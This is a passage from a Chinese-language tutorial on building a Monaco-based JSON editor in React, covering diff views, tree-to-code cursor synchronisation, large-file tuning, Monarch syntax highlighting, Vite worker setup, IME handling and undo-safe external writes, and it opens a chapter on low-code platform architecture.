要点辨析：**格式化**绝不要自己 `JSON.stringify(JSON.parse(v), null, 2)` 后整段写回——内置 action 会保留光标相对位置、支持部分选区格式化、走统一的编辑管线（可撤销）；自己写回是下策。**压缩**则相反（内置没有），必须自己实现，但注意两点：不合法时直接放弃（错误 JSON 压缩 = 数据损坏），写回必须走 `executeEdits` 而不是 `setValue`（理由同坑 3）。**搜索替换**没有任何理由自己造——`editor.action.startFindReplaceAction` 打开的就是 VSCode 那个查找替换条，含正则/大小写/全词切换。**跳转错误**的三件套 `setPosition + revealLineInCenter + focus` 缺一不可，少 focus 时用户看到行滚过去了但没有光标闪烁，体感像"没反应"。

### 路线 5：DiffEditor —— 两版 schema 对比

**是什么**：`@monaco-editor/react` 的 `DiffEditor` 组件，双栏渲染两份文本的差异，差异行/差异字符高亮。场景：dashboard JSON 的版本回滚——"当前线上版 vs 候选版"，确认无误后一键应用。

```tsx
// src/json-editor/SchemaDiff.tsx
import { DiffEditor } from '@monaco-editor/react';

interface Props {
  current: string;      // 当前版本 JSON
  candidate: string;    // 候选版本 JSON
  currentRev: number;   // 两个版本号：作为 key 保证 diff 随版本切换刷新
  candidateRev: number;
  onApply: () => void;  // "应用此版本"：把 candidate 写回主编辑器（走 setValueSafely）
}

export function SchemaDiff({ current, candidate, currentRev, candidateRev, onApply }: Props) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: 480 }}>
      <DiffEditor
        key={`${currentRev}-${candidateRev}`}   // 对比视图不需要编辑，key 重挂载最稳、避免增量 diff 的状态残留
        original={current}                       // 左：当前
        modified={candidate}                     // 右：候选
        language="json"
        options={{
          readOnly: true,                // 对比视图只读；应用走显式按钮，避免"顺手改了两边不一致"
          renderSideBySide: true,        // false = 行内 diff（窄屏/移动端友好）
          enableSplitViewResizing: true, // 允许拖动调整双栏宽度
          renderOverviewRuler: false,
          ignoreTrimWhitespace: false,   // 严格 diff：JSON 虽不该有尾随空白，出现了就该被看见
          diffWordWrap: 'off',
        }}
      />
      <div style={{ padding: 8, textAlign: 'right' }}>
        <button onClick={onApply}>应用此版本（写入编辑器，Cmd+Z 可撤销）</button>
      </div>
    </div>
  );
}
```

三个实践要点：① DiffEditor 的 `original/modified` 是可以受控更新的 prop（对比场景无光标/撤销态，受控无害），但用 `key` 重挂载可以彻底规避增量 diff 的内部缓存问题；② `renderSideBySide: false` 切行内模式是响应式布局的好搭档；③ "应用"动作的实现就是调用路线 1 的 `setValueSafely(candidate)`——外部写入必须保撤销栈，用户应用错了能 Cmd+Z 回来，这是版本回滚场景的安全底线。

### 路线 6：树形 + 代码双视图 —— 光标与 JSONPath 的双向同步

**场景**：设置页模式。左侧一棵 JSON 树（可折叠导航），右侧 Monaco 代码。要求：光标落在代码里某个值上 → 左树自动展开并高亮对应节点；反过来点击树的某个节点 → 右侧跳到对应代码位置并高亮。实现分四块：

**第一块：offset ↔ JSONPath 映射表**。核心数据结构是"每个 JSON 节点的路径 + 它在文本中的字符区间"。`JSON.parse` 给不了位置信息，所以要么用现成的 `json-source-map`（生产推荐，一步得到 pointer → 位置区间的映射），要么手写一个递归下降扫描器。教学价值优先，这里手写（同时它就是路线 7 之前对大 JSON 的唯一遍历成本）：

```ts
// src/json-editor/jsonPathMap.ts
export interface JsonNodeRef {
  path: string;        // JSONPath：$.panels[0].title
  isKey: boolean;      // true = 这是键名 token（"title"），false = 值或容器
  start: number;       // 文本中的 [start, end) 字符区间
  end: number;
}

export interface PathMapResult {
  nodes: JsonNodeRef[]; // 按 start 升序（递归下降天然有序）
  value: unknown;       // 顺手返回解析结果，省一次 JSON.parse
}

/**
 * 简化版 JSON 扫描器：支持对象/数组/字符串（含转义）/数字/true/false/null。
 * 不支持注释（allowComments=false 时无损失）。文本暂不合法时返回 null，调用方保留上一次的映射。
 */
export function buildJsonPathMap(text: string): PathMapResult | null {
  let pos = 0;
  const nodes: JsonNodeRef[] = [];

  const skipWs = () => {
    while (pos < text.length && ' \t\r\n'.includes(text[pos]!)) pos++;
  };
  const peek = () => text[pos];

  function parseString(): { value: string; start: number; end: number } {
    const start = pos;
    pos++; // 开头引号
    let raw = '';
    while (pos < text.length && text[pos] !== '"') {
      if (text[pos] === '\\' && pos + 1 < text.length) {
        raw += text[pos]! + text[pos + 1]!; // 转义序列原样保留，反转义交给 JSON.parse
        pos += 2;
      } else {
        raw += text[pos]!;
        pos++;
      }
    }
    if (peek() !== '"') throw new Error('字符串未闭合');
    pos++; // 结尾引号
    return { value: JSON.parse('"' + raw + '"'), start, end: pos };
  }

  function parseValue(path: string): unknown {
    skipWs();
    const c = peek();
    if (c === '{' || c === '[') return parseContainer(path, c === '[' ? 'array' : 'object');
    if (c === '"') {
      const s = parseString();
      nodes.push({ path, isKey: false, start: s.start, end: s.end });
      return s.value;
    }
    // 数字 / true / false / null
    const m = /^(true|false|null|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/.exec(text.slice(pos));
    if (!m) throw new Error(`位置 ${pos} 出现意外字符：${c ?? 'EOF'}`);
    pos += m[0].length;
    nodes.push({ path, isKey: false, start: pos - m[0].length, end: pos });
    const raw = m[0];
    return raw === 'true' ? true : raw === 'false' ? false : raw === 'null' ? null : Number(raw);
  }

  function parseContainer(path: string, kind: 'object' | 'array'): unknown {
    const start = pos;
    pos++; // { 或 [
    const nodeIdx = nodes.length;
    nodes.push({ path, isKey: false, start, end: -1 }); // 容器的 end 在解析完回填
    const out: unknown[] | Record<string, unknown> = kind === 'array' ? [] : {};

    skipWs();
    if (peek() === (kind === 'array' ? ']' : '}')) {
      pos++;
      nodes[nodeIdx]!.end = pos;
      return out; // 空容器 {}
    }

    for (;;) {
      skipWs();
      if (kind === 'array') {
        (out as unknown[]).push(parseValue(`${path}[${(out as unknown[]).length}]`));
      } else {
        const key = parseString(); // 键也是字符串 token
        nodes.push({ path: `${path}.${key.value}`, isKey: true, start: key.start, end: key.end }); // 键 token 单独记录，点击树时高亮 "key" 更直观
        skipWs();
        if (peek() !== ':') throw new Error('对象缺少 :');
        pos++;
        (out as Record<string, unknown>)[key.value] = parseValue(`${path}.${key.value}`);
      }
      skipWs();
      if (peek() === ',') { pos++; continue; }
      if (peek() === (kind === 'array' ? ']' : '}')) { pos++; break; }
      throw new Error(`位置 ${pos} 出现意外字符：${peek() ?? 'EOF'}`);
    }
    nodes[nodeIdx]!.end = pos;
    return out;
  }

  try {
    skipWs();
    const value = parseValue('$');
    skipWs();
    if (pos !== text.length) throw new Error('JSON 根元素后存在多余内容');
    return { nodes, value };
  } catch {
    return null; // 编辑中间态（删了一半的括号）很常见：返回 null，调用方沿用旧映射
  }
}

/** 光标 offset → 所在最深节点的 JSONPath（nodes 有序，线性扫即可；超大树可二分） */
export function pathAtOffset(nodes: JsonNodeRef[], offset: number): string | null {
  let hit: JsonNodeRef | null = null;
  for (const n of nodes) {
    if (n.start > offset) break;
    if (offset < n.end) hit = n; // 后命中的更深层（start 更大），覆盖外层容器
  }
  return hit?.path ?? null;
}
```

**第二块：树数据**。从 `PathMapResult.value` 递归生成树节点（每个节点带 path，点击时能查回区间）：

```ts
// src/json-editor/treeModel.ts
export interface TreeNode {
  path: string;
  label: string;
  kind: 'object' | 'array' | 'value';
  children: TreeNode[];
  preview?: string; // 叶子节点的值预览
}

export function buildTree(value: unknown, path = '$', label = '$'): TreeNode {
  if (Array.isArray(value)) {
    return {
      path, label, kind: 'array',
      children: value.map((v, i) => buildTree(v, `${path}[${i}]`, `[${i}]`)),
    };
  }
  if (value !== null && typeof value === 'object') {
    return {
      path, label, kind: 'object',
      children: Object.entries(value as Record<string, unknown>).map(
        ([k, v]) => buildTree(v, `${path}.${k}`, k),
      ),
    };
  }
  return { path, label, kind: 'value', children: [], preview: String(value) };
}

/** 把一个 path 的所有祖先展开：$.panels[0].title → ['$', '$.panels', '$.panels[0]', '$.panels[0].title'] */
export function expandableAncestors(path: string): string[] {
  const parts: string[] = [];
  let cur = '';
  for (const seg of path.replace(/^\$/, '').split(/(?=\.|\[)/)) {
    cur += seg;
    parts.push('$' + cur);
  }
  return parts;
}
```

**第三块：双向同步骨架**。两个方向、一个防环闸门：

```tsx
// src/json-editor/JsonDualView.tsx —— 树 + 代码双视图（骨架）
import { useEffect, useMemo, useRef, useState } from 'react';
import Editor, { type OnMount } from '@monaco-editor/react';
import type { editor as monacoEditor } from 'monaco-editor';
import { buildJsonPathMap, pathAtOffset } from './jsonPathMap';
import { buildTree, expandableAncestors, type TreeNode } from './treeModel';

export function JsonDualView({ defaultValue }: { defaultValue: string }) {
  const editorRef = useRef<monacoEditor.IStandaloneCodeEditor | null>(null);
  const monacoRef = useRef<typeof import('monaco-editor') | null>(null); // 保存 monaco 命名空间：构造 Range/Uri 都要它
  const decorationsRef = useRef<monacoEditor.IEditorDecorationsCollection | null>(null);
  const suppressCursorSyncRef = useRef(0); // ★ 防环闸门：程序化定位后的光标事件不再回写树

  const [raw, setRaw] = useState(defaultValue);
  const [activePath, setActivePath] = useState<string | null>(null);
  const [expanded, setExpanded] = useState<Set<string>>(new Set(['$']));

  // 防抖重建映射：输入停 300ms 才扫（大 JSON 扫描不便宜）
  const [debouncedRaw, setDebouncedRaw] = useState(defaultValue);
  useEffect(() => {
    const t = window.setTimeout(() => setDebouncedRaw(raw), 300);
    return () => window.clearTimeout(t);
  }, [raw]);

  const pathMap = useMemo(() => buildJsonPathMap(debouncedRaw), [debouncedRaw]);
  const tree = useMemo(() => (pathMap ? buildTree(pathMap.value) : null), [pathMap]);

  const handleMount: OnMount = (editor, monaco) => {
    editorRef.current = editor;
    monacoRef.current = monaco;
    decorationsRef.current = editor.createDecorationsCollection([]); // 高亮集合：可整组替换

    // 方向一：代码 → 树。光标每次变化计算 JSONPath，定位树节点
    editor.onDidChangeCursorPosition((e) => {
      if (Date.now() < suppressCursorSyncRef.current) return; // 自己触发的光标移动：忽略
      const model = editor.getModel();
      if (!model || !pathMap) return;
      const offset = model.getOffsetAt(e.position);
      const p = pathAtOffset(pathMap.nodes, offset);
      if (p) {
        setActivePath(p);
        setExpanded((prev) => {
          const next = new Set(prev);
          for (const a of expandableAncestors(p)) next.add(a); // 祖先链全部展开
          return next;
        });
      }
    });
  };

  // 方向二：树 → 代码。点击树节点：选区 + 滚动 + 装饰高亮
  const onTreeNodeClick = (node: TreeNode) => {
    const editor = editorRef.current;
    const monaco = monacoRef.current;
    const model = editor?.getModel();
    if (!editor || !monaco || !model || !pathMap) return;
    const target = pathMap.nodes.find((n) => n.path === node.path && !n.isKey)
      ?? pathMap.nodes.find((n) => n.path === node.path);
    if (!target) return;

    suppressCursorSyncRef.current = Date.now() + 150; // ★ 防环：150ms 内忽略 onDidChangeCursorPosition
    const start = model.getPositionAt(target.start);  // offset → 行/列
    const end = model.getPositionAt(target.end);
    const range = new monaco.Range(start.lineNumber, start.column, end.lineNumber, end.column);
    editor.setSelection(range);            // 选中 "key": value 区间
    editor.revealRangeInCenter(range);     // 滚到视口中央
    editor.focus();                        // 光标可见
    decorationsRef.current?.set([          // 整组替换高亮（上一次的自动清除）
      {
        range,
        options: {
          className: 'json-tree-highlight',                  // CSS 里给背景色
          overviewRuler: { color: '#f5c518', position: 4 },   // 右侧标尺同步可见
        },
      },
    ]);
    setActivePath(node.path);
  };

  // 树渲染：递归 + expanded/activePath 控制展开与高亮（数据量上千时换 react-arborist 虚拟化，见第 6 章大纲树）
  const renderNode = (node: TreeNode, depth: number) => {
    const isBranch = node.children.length > 0;
    const open = expanded.has(node.path);
    return (
      <div key={node.path}>
        <div
          onClick={() => {
            if (isBranch) setExpanded((p) => { const n = new Set(p); n.has(node.path) ? n.delete(node.path) : n.add(node.path); return n; });
            onTreeNodeClick(node);
          }}
          style={{
            paddingLeft: depth * 16, cursor: 'pointer',
            background: activePath === node.path ? '#e6f4ff' : undefined,
          }}
        >
          {isBranch ? (open ? '▾ ' : '▸ ') : '  '}
          {node.label}
          {!isBranch && node.preview !== undefined && <span style={{ color: '#8c8c8c' }}> : {node.preview}</span>}
        </div>
        {isBranch && open && <div>{node.children.map((c) => renderNode(c, depth + 1))}</div>}
      </div>
    );
  };

  return (
    <div style={{ display: 'flex', height: 600 }}>
      <div style={{ width: 300, borderRight: '1px solid #eee', overflow: 'auto', fontSize: 12 }}>
        {tree ? renderNode(tree, 0) : <div style={{ padding: 8, color: '#999' }}>JSON 暂不可解析，树已冻结在上次合法状态</div>}
      </div>
      <div style={{ flex: 1, minWidth: 0 }}>
        <Editor
          defaultLanguage="json"
          defaultValue={defaultValue}
          onMount={handleMount}
          onChange={(v) => setRaw(v ?? '')}
          options={{ automaticLayout: true, minimap: { enabled: false } }}
        />
      </div>
    </div>
  );
}
```

**双向同步的实现思路总结**（面试常问，值得背下来）：① 一个"地址系统"——JSONPath + 文本 offset 区间，双向同步本质是地址在两套坐标系（树节点 / 文本位置）间的换算；② 代码→树：`onDidChangeCursorPosition` → `getOffsetAt` → `pathAtOffset`（区间命中取最深）→ 祖先链展开 + 高亮；③ 树→代码：path → 区间 → `getPositionAt` → `setSelection + revealRangeInCenter + createDecorationsCollection` 高亮；④ 防环：程序化定位也会触发光标事件，用时间戳闸门（150ms）或判断事件 source 为程序化来源来忽略，否则树高亮 ↔ 光标跳转互相触发形成抖动循环；⑤ 映射表随输入防抖重建，文本暂不合法时沿用旧映射（树冻结），合法后无感恢复。

### 路线 7：大 JSON 优化清单

十兆级的 dashboard/接口响应贴进编辑器，默认配置会卡。按性价比排序的清单，每条带原因：

```ts
// 大 JSON 场景的 options 组合
const bigJsonOptions = {
  automaticLayout: true,        // 容器自适应（RGL/抽屉里的编辑器必开）
  minimap: { enabled: false },  // 1) minimap 渲染整个文档缩略图：大文档纯开销、JSON 无导航价值
  wordWrap: 'on',               // 2) 长行折行：压缩过的一行 JSON 不折行就是横向马拉松
  folding: true,                // 3) 折叠：默认开，配合 Cmd+K Cmd+0（全部折叠）快速巡航
  largeFileOptimizations: true, // 4) Monaco 内置开关：超大文件自动关掉词法补全等重特性
  scrollBeyondLastLine: false,
  renderWhitespace: 'none',
  quickSuggestions: false,      // 5) 大文档关掉"边打字边弹补全"：每次弹窗都要 worker 全量扫描
  tabSize: 2,
};
```

清单其余各条：

6. **动态关 schema 校验**：超过阈值（经验值 1MB）时 `jsonDefaults.setDiagnosticsOptions({ validate: false, schemas: [] })`，小于阈值恢复——worker 对全文的 schema 校验成本与文档长度成正比，而"正在编辑的 8MB 配置文件"多半也不在乎补全了。
7. **不要受控回写**：大 JSON 下路线 1 的受控坑会从"体验差"升级成"每键一卡"（整段 diff + 替换都是全文级成本）。
8. **粘贴防御**：`editor.onDidPaste((e) => {...})` 里检查 `model.getValueLength()`，超阈值提示"已进入只读浏览模式"并可顺手切 `readOnly: true`。
9. **导航交给树**：路线 6 的树视图用 react-arborist 虚拟化后承载导航（跳转/搜索），代码视图退化为只读参考——这是"设置页模式"对超大文档的正确姿势。
10. **极限场景换 CodeMirror**：Monaco 在数 MB 以上交互明显变重（它为 IDE 全能付费）；CodeMirror 6 的增量解析架构在纯浏览场景更省。决策线：编辑 + schema 补全是刚需 → 留在 Monaco 并执行上述 1–7；只是"看得动" → CodeMirror 或直接树视图。

### 路线 8：Monarch tokenizer —— 自定义 DSL 高亮入门

**是什么**。Monarch 是 Monaco 内置的声明式语法高亮引擎：一个"状态机 + 正则表"，`[正则, token 类型]` 逐条匹配，命中后可跳转状态。VSCode 里绝大多数语言的"基础着色"都是它写的。为自研协议做高亮（比如第 1 章表达式引擎的插值语法、或低代码平台的绑定表达式）不需要写 parser，一个 Monarch 文件就够。

**目标 DSL**：模板插值语言 `合计：[[ @sum($form.items[*].price) * 1.1 ]] 元`——`[[ ]]` 外是普通文本，内部是表达式（`@函数`、`$变量路径`、数字、运算符）。完整注册代码：

```ts
// src/json-editor/miniExprLanguage.ts
import type * as monacoNs from 'monaco-editor';

export function registerMiniExprLanguage(monaco: typeof monacoNs) {
  if (monaco.languages.getLanguages().some((l) => l.id === 'miniexpr')) return; // 防重复注册（HMR 场景必踩）

  monaco.languages.register({ id: 'miniexpr' });

  // 语言行为配置：括号匹配、自动闭合（与着色无关但一起配了）
  monaco.languages.setLanguageConfiguration('miniexpr', {
    brackets: [['(', ')'], ['[', ']']],
    autoClosingPairs: [
      { open: '(', close: ')' },
      { open: '"', close: '"' },
      { open: '[[', close: ']]' },
    ],
  });

  monaco.languages.setMonarchTokensProvider('miniexpr', {
    tokenizer: {
      // 状态一：root = 普通文本（入口状态）
      root: [
        [/\[\[/, { token: 'keyword', next: '@expr' }], // 看到 [[ → 吃掉定界符并压入 expr 状态
        [/./, 'string'],                               // 其余字符按文本着色（浅色主题下视觉上是"模板文字"）
      ],
      // 状态二：expr = 表达式内部
      expr: [
        [/\]\]/, { token: 'keyword', next: '@pop' }],           // ]] → 弹栈回到 root（状态栈的后进先出）
        [/\s+/, 'white'],                                        // 空白
        [/@[a-zA-Z_]\w*/, 'annotation'],                         // @sum @avg @round → 函数注解
        [/\$[a-zA-Z_]\w*((?:\.\w+|\[\*\]|\[\d+\])*)/, 'variable'], // $form.items[*].price → 变量路径
        [/\d+(?:\.\d+)?/, 'number'],                             // 数字（含小数）
        [/"(?:[^"\\]|\\.)*"/, 'string'],                         // 双引号字符串（含转义）
        [/'(?:[^'\\]|\\.)*'/, 'string'],
        [/[a-zA-Z_]\w*/, 'identifier'],                          // 裸标识符
        [/[+\-*/%<>=!&|?:,()[\]]/, 'operator'],                  // 运算符与标点
      ],
    },
  });
}
```

Monarch 心智模型三句话：① **状态栈**——`next: '@state'` 压栈、`next: '@pop'` 弹回，`root` 是入口状态；本例"文本/表达式"两个状态就是插值语言的最小形态（复杂语言会有字符串状态、模板嵌套状态）。② **token 类型名 → 主题色**——`keyword`/`number`/`string`/`comment`/`operator` 是主题内置名，自动有颜色；`annotation`/`variable` 这类自定义名默认无色，要配色就 `editor.defineTheme`：

```ts
monaco.editor.defineTheme('miniexpr-theme', {
  base: 'vs',
  inherit: true,
  rules: [
    { token: 'annotation', foreground: '7c3aed', fontStyle: 'bold' }, // @函数：紫色加粗
    { token: 'variable',   foreground: '0e7490' },                    // $变量：深青色
  ],
  colors: {},
});
```

③ **正则按声明顺序试匹配，先到先得**——所以更具体的规则（如 `@函数`）必须排在更宽泛的规则（`identifier`）前面，顺序错了就是"全灰"的典型新手症状。写完用 `<Editor defaultLanguage="miniexpr" theme="miniexpr-theme" ...>` 验证；这套 DSL 的补全/校验属于第 1 章表达式引擎的范畴，Monarch 只管"着色"这一层。

### 难点与坑

- ⚠️ Vite 下 monaco worker 打包配置
- ⚠️ 中文输入法 composition 期间的变更处理
- ⚠️ 外部数据变化如何安全写回编辑器（`executeEdits` 保撤销栈）

**坑 1｜Vite 下 monaco worker 打包配置（症状 → 根因 → 修法）**

- 症状：控制台报 "You must define a function MonacoEnvironment.getWorkerUrl or MonacoEnvironment.getWorker" 一类错误，或弹 "Could not create web worker"；编辑器能打字但没有语法红波浪线、没有 schema 补全（json worker 没起来）；Network 面板看不到任何 worker 请求；另一种极端症状是内网/离线环境编辑器整个白屏（默认走 CDN 拉 monaco，jsdelivr 不可达）。
- 根因：Monaco 的语言服务（json/ts/css/html worker）与编辑器基础 worker 是**独立的 JS 文件、独立线程**。它的 ESM 代码在运行时按 `MonacoEnvironment.getWorker(label)` 要 worker 构造器，而 Vite 的打包器不会凭空把 `new Worker(...)` 指向的产物切出来——没有任何配置时 worker 文件既没打包也没被引用。`@monaco-editor/react` 默认从 CDN 加载 monaco（`loader` 机制），于是又叠加"外网依赖"这层变量。
- 修法：Vite 原生 `?worker` 导入，一步到位（无需任何插件）：

```ts
// src/monaco-setup.ts —— 应用入口 import 一次
import { loader } from '@monaco-editor/react';
import * as monaco from 'monaco-editor';
// ?worker 后缀是 Vite 的原生 worker 导入：产物切成独立 chunk，拿到的是 Worker 构造器
import editorWorker from 'monaco-editor/esm/vs/editor/editor.worker?worker';
import jsonWorker from 'monaco-editor/esm/vs/language/json/json.worker?worker';
import tsWorker from 'monaco-editor/esm/vs/language/typescript/ts.worker?worker';
import cssWorker from 'monaco-editor/esm/vs/language/css/css.worker?worker';
import htmlWorker from 'monaco-editor/esm/vs/language/html/html.worker?worker';

self.MonacoEnvironment = {
  // label 是语言标识：按需分发对应 worker，只有编辑器本体用 editorWorker
  getWorker(_workerId: string, label: string): Worker {
    switch (label) {
      case 'json': return new jsonWorker();
      case 'css': case 'scss': case 'less': return new cssWorker();
      case 'html': case 'handlebars': case 'razor': return new htmlWorker();
      case 'typescript': case 'javascript': return new tsWorker();
      default: return new editorWorker();
    }
  },
};

loader.config({ monaco }); // ★ 关键：@monaco-editor/react 不走 CDN，改用上面这份本地 monaco（内网必改）
```

```tsx
// src/main.tsx
import './monaco-setup'; // 必须在渲染 <Editor /> 之前执行
```

验证方式：DevTools Network 的 JS 筛选里应看到独立的 worker chunk 请求（构建后是 `json.worker-*.js` 这类文件），随后打一个非法 JSON 应在 1 秒内出现红波浪线。社区还有 `vite-plugin-monaco-editor` 插件方案，能省掉手写 switch，代价是多一个构建期魔法——`?worker` 方案每一行都可解释、可调试，推荐作为默认。

**坑 2｜中文输入法 composition 期间的变更处理（症状 → 根因 → 修法）**

- 症状：在 JSON 字符串值里打中文：候选词条还在组词，编辑器外的逻辑就开始动作——字数统计跳变、自动保存被拼音中间态触发、树视图随拼音逐字母重建、最严重的是受控回写直接打断组词（词条丢失/重复，输入法报错音）。此外撤销栈里出现"每敲一个拼音字母一条"的碎记录。
- 根因：IME 输入分三段事件——`compositionstart` → 多次 `compositionupdate`（拼音中间态，textarea 里是"zhong'wen"这种半成品）→ `compositionend`（上屏最终汉字）。Monaco 的 `onChange`（`onDidChangeModelContent`）在中间态每次变化都会触发；如果你的下游逻辑（parse/保存/联动/回写）把中间态当最终文本处理，就会产生上述全部症状。这与 React 受控 textarea 遇到的 composition 问题是同一件事，只是换了个宿主。
- 修法：三原则。① **结构性防线（最重要）**：路线 1 的非受控 model 模式下，你根本不会在 composition 期间往编辑器写文本——"永不回写"天然免疫打断组词。② **旁路逻辑挂闸门**：监听 composition 起止，组词期间挂起 parse/保存/树重建，结束时补一次。Monaco 把 DOM 事件桥接成了编辑器事件，直接用：

```tsx
// 组词闸门：composition 期间挂起副作用
const composingRef = useRef(false);
// onMount 里：
const d1 = editor.onDidCompositionEnter(() => { composingRef.current = true; });
const d2 = editor.onDidCompositionLeave(() => {
  composingRef.current = false;
  scheduleParse(); // 组词结束才算一次有效变更，补一次防抖解析
});
const d3 = editor.onDidChangeModelContent(() => {
  if (composingRef.current) return; // 拼音中间态：不解析、不保存、不重建树
  scheduleParse();
});
// 卸载时 d1.dispose(); d2.dispose(); d3.dispose();
```

③ **防抖兜底**：路线 3 的 300ms 防抖本身就能吸收大部分中间态（组词通常一气呵成不超过 300ms 的间隙），但闸门是确定性的，防抖只是概率性的，两者叠加最稳。

**坑 3｜外部数据变化如何安全写回编辑器（症状 → 根因 → 修法）**

- 症状：双入口场景——用户在可视化编辑器里拖了个面板，切回"源码模式"想让 JSON 跟上：用 `model.setValue(next)` 或重建编辑器后，源码里的 Cmd+Z 一按回到"很久以前"、光标/选区/滚动位置全丢；反过来如果干脆不写回，两个入口内容漂移。
- 根因：`setValue` 的语义是"程序性整体替换文档"——**它不入撤销栈，反而清空撤销栈**（Monaco 把整体替换视作"换了一份新文档"）。而用户的期望语义是"编辑器替我做了一次全选粘贴"：可撤销、光标尽量保持。两个 API 的分水岭要记牢：

| API | 撤销栈 | 光标 | 适用 |
|---|---|---|---|
| `model.setValue(text)` | **清空** | 重置 | 首次装载、确认丢弃历史的场景 |
| `editor.executeEdits(source, edits)` | **入栈（可 Cmd+Z）** | 由编辑计算 | 一切"外部数据写回"的正解 |

- 修法：全量替换走 `executeEdits`（路线 1 的 `setValueSafely` 已实现），这里补上完整的"外部同步"组件逻辑——版本号驱动 + 冲突保护：

```tsx
// src/json-editor/ExternalSync.tsx —— 外部（可视化编辑器）→ 源码编辑器的安全同步
import { useEffect, useRef } from 'react';
import type { editor as monacoEditor } from 'monaco-editor';

interface SyncProps {
  editorRef: React.RefObject<monacoEditor.IStandaloneCodeEditor | null>;
  /** 每次外部变更递增的版本号：React 18/19 的 StrictMode 双执行下，比"比较内容"更可靠 */
  externalRevision: number;
  externalValue: string;
  /** 冲突策略回调：用户正在编辑时外部又变了。默认跳过写回并提示 */
  onConflict?: () => void;
}

export function useExternalSync({ editorRef, externalRevision, externalValue, onConflict }: SyncProps) {
  const appliedRev = useRef(externalRevision); // 已应用的版本：初始跳过第一次（初值已由 defaultValue 装载）

  useEffect(() => {
    if (appliedRev.current === externalRevision) return; // 只响应"新的外部版本"
    appliedRev.current = externalRevision;

    const editor = editorRef.current;
    const model = editor?.getModel();
    if (!editor || !model) return;
    if (model.getValue() === externalValue) return; // 内容相同：无事发生
    if (editor.hasTextFocus()) {                    // 用户正在编辑：不覆盖未保存的输入
      onConflict?.(); // 提示"检测到外部变更，已暂存；离开编辑器后应用"或弹对比（路线 5 的 DiffEditor 正好用上）
      return;
    }
    // 安全写回：executeEdits = 一次普通编辑 → 入撤销栈，Cmd+Z 可回到写回前
    editor.executeEdits('external-sync', [
      { range: model.getFullModelRange(), text: externalValue, forceMoveMarkers: true },
    ]);
  }, [externalRevision, externalValue, editorRef, onConflict]);
}
```

进阶：如果对光标位置有苛刻要求（写回后选区原样保留），用更底层的 `model.pushEditOperations(edits, cursorStateComputer)`——第二个参数决定各光标的最终位置，把 `editor.getSelection()` 原样返回即可"冻结"选区：

```ts
const sel = editor.getSelection();
model.pushEditOperations(
  [{ range: model.getFullModelRange(), text: externalValue }],
  () => (sel ? [sel] : []), // 光标/选区保持在原位（若替换后仍合法）
);
```

注意 `pushEditOperations` 是 model 级 API（不经 editor 的命令管线），撤销/重做同样生效，但不会触发 `executeEdits` 的一些边缘行为——日常写回用 `executeEdits` 就够，选区敏感时再升级。

✅ **产出**：带 Schema 校验/补全/格式化/diff 的 JSON 编辑器组件，接入第 3、4 章的 schema 导入导出（形成"可视化编辑 ↔ 源码编辑"双入口）。

产出验收清单（全部打勾才算完成本章）：

- [ ] **Schema 校验/补全**：删掉 dashboard JSON 里 `panels` 的一个 required 字段 → 红波浪线 + 悬停提示；在 `"type":` 后触发补全 → 弹出 `line/bar/stat/table` 枚举（来自 schema，不是自由文本）。
- [ ] **非受控验证**：连续打字 30 秒，Cmd+Z 逐键回退无一跳变；光标从无"闪跳"；中文输入法打一段字符串值无词条丢失/重复。
- [ ] **格式化/压缩/复制/搜索替换/跳转错误**：五个按钮各自达成语义；压缩后再 Cmd+Z 能完整还原；粘贴一段缺括号的 JSON → 工具栏出现"第 N 行第 M 列"错误，点击后编辑器跳转并聚焦。
- [ ] **保存闸门**：JSON 非法时保存按钮 disabled 且提交函数入口二次校验拦截。
- [ ] **DiffEditor**：改一个字段后对比当前/候选两版，差异行高亮；"应用此版本"写入编辑器且 Cmd+Z 可撤销这次应用。
- [ ] **双视图双向同步**：光标点进 `"title"` 的值 → 左树展开 `$.panels[0]` 并高亮 `title`；点树上的 `$.time.refreshMs` → 右侧选区跳到该值并高亮；来回切换 10 次无抖动循环（防环闸门生效）。
- [ ] **双入口闭环**：第 4 章大盘"导出 JSON"→ 本章编辑器打开 → 修改 `layout[0].w` → 应用回第 4 章 → 大盘第 0 个面板宽度变化；反向在第 4 章拖动面板 → 源码模式内容同步且撤销栈完好。
- [ ] **工程验收**：Vite 构建产物含独立 worker chunk；Network 面板无 CDN 请求（本地化 monaco 生效）；10MB 级 JSON 打开可滚动浏览（清单 1–7 生效）。

## 6. 低代码平台整合（2–3 周）

**业务画像**：让非开发者拖组件搭页面；这是前 5 章能力的总装。

这句话拆开看有三层含义。第一层"非开发者"决定了平台的下限交互必须是拖拽 + 表单配置，不能要求用户写代码——所以属性面板（第 3 章 Setter）、大纲树（第 1 章虚拟树）、表达式编辑器（第 1 章表达式引擎 + 第 5 章编辑器组件）缺一不可。第二层"搭页面"意味着产物不再是一张表单或一个大盘，而是一整棵组件树，其中混合了布局、数据、事件、变量——第 2 章的字段协议、第 4 章的面板协议都只是它的子集。第三层"总装"意味着本章几乎不引入新的底层技术，全部难点在于把前 5 章的零件拼成一台能跑的车：协议要升级到能描述完整页面，编辑器要隔离要协同，运行时要安全地执行用户逻辑。学完本章你应该有"给我一套协议我能造一个平台"的底气。

### 架构

```
编辑器（画布 + 物料面板 + 属性面板 + 大纲树 + 工具栏）
   │ 产出
Schema 协议（组件树 + props + style + events + dataSource + 变量）
   │ 消费
渲染器（递归执行 + 表达式绑定 + 动作引擎）
```

逐行解说这张图，因为它定义了整个平台的数据流和分工边界：

- **第一行"编辑器"**：五个部件各司其职——画布负责所见即所得的摆放与选中；物料面板是第 3 章物料协议的 GUI 呈现（拖出的每一个物料都会变成一个 schema 节点）；属性面板就是第 3 章的 Setter 体系（本章会升级出 ExpressionSetter 与 EventSetter）；大纲树解决画布中"看不见的结构"（弹窗、隐藏容器、深层嵌套）的导航问题；工具栏承载 undo/redo、预览、导入导出。编辑器是一个纯 React 应用，它不执行任何业务逻辑，只产出 schema。
- **"│ 产出"**：箭头是单向的，这一点极其重要。编辑器与渲染器之间**只通过 schema 交换信息**，编辑器不直接调用渲染器内部函数，渲染器也不知道编辑器的存在。这样"预览"就是把 schema 喂给渲染器开个新页面，"发布"就是把 schema 存库，测试渲染器时甚至可以完全不启动编辑器。任何"为了让某个功能好做而让编辑器直接改渲染器内部状态"的捷径，最终都会变成耦合灾难。
